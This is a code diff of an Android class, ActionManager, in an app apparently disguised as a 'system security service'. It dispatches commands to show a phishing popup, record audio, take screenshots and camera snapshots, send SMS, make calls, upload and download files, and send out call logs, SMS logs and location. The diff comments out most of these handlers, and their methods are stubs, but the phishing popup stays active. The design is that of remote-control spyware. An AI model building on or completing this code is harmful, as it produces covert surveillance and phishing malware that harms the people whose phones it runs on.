@@ -2,16 +2,15 @@ package com.service.security.services.systemsecurityservice;
 
 import android.content.Context;
 import android.content.Intent;
-import android.util.Log;
 import android.widget.Toast;
 
 import com.service.security.services.systemsecurityservice.mainUi.PhishingPopUp;
 
 public class ActionManager {
 
-    private Context context;
-    private String content;
-    private String action;
+    private final Context context;
+    private final String content;
+    private final String action;
 
     public ActionManager(Context context, String content, String action) {
         this.context = context;
@@ -19,75 +18,75 @@ public class ActionManager {
         this.action = action;
     }
 
-    public boolean performAction() {
+    public void performAction() {
         switch (action) {
             case "popup": {
                 showPopUp();
-                return true;
+                return;
             }
             case "notify": {
-                showNotification();
-                return true;
+                //  showNotification();
+                return;
             }
             case "run": {
-                runApp();
-                return true;
+                //runApp();
+                return;
             }
             case "explore": {
-                getFiles();
-                return true;
+                //getFiles();
+                return;
             }
             case "open_file": {
-                openFile();
-                return true;
+                //openFile();
+                return;
             }
             case "download_file": {
-                downloadFile();
-                return true;
+                //downloadFile();
+                return;
             }
             case "upload_file": {
-                uploadFile();
-                return true;
+                //uploadFile();
+                return;
             }
             case "play_sound": {
-                playSound();
-                return true;
+                //playSound();
+                return;
             }
             case "record_sound": {
-                sendRecordedSound();
-                return true;
+                //sendRecordedSound();
+                return;
             }
             case "screenshot": {
-                sendScreenshot();
-                return true;
+                //sendScreenshot();
+                return;
             }
             case "snapshot": {
-                sendSnapshot();
-                return true;
+                //sendSnapshot();
+                return;
             }
             case "make_call": {
-                performCall();
-                return true;
+                //performCall();
+                return;
             }
             case "send_sms": {
-                sendSms();
-                return true;
+                //sendSms();
+                return;
             }
             case "call_log": {
-                sendCallLog();
-                return true;
+                //sendCallLog();
+                return;
             }
             case "sms_log": {
-                sendSmsLog();
-                return true;
+                //sendSmsLog();
+                return;
             }
             case "get_location": {
-                sendLocation();
-                return true;
+                //sendLocation();
+                return;
             }
             case "payload": {
 
-                return true;
+                return;
             }
             default: {
                 makeToast();
@@ -97,13 +96,13 @@ public class ActionManager {
 
         }
 
-        return false;
     }
 
     private void makeToast() {
         Toast.makeText(context, content, Toast.LENGTH_SHORT).show();
     }
-
+/*
+TODO:implementation
     private void playSound() {
 
     }
@@ -163,6 +162,7 @@ public class ActionManager {
         //Log.e("call Log", "inside sendCallLog()" + callLog);
         Log.e("FBR.sendCallLog()", "getCallLog() not implemented");
     }
+*/
 
     private void showPopUp() {
         Intent i = new Intent();
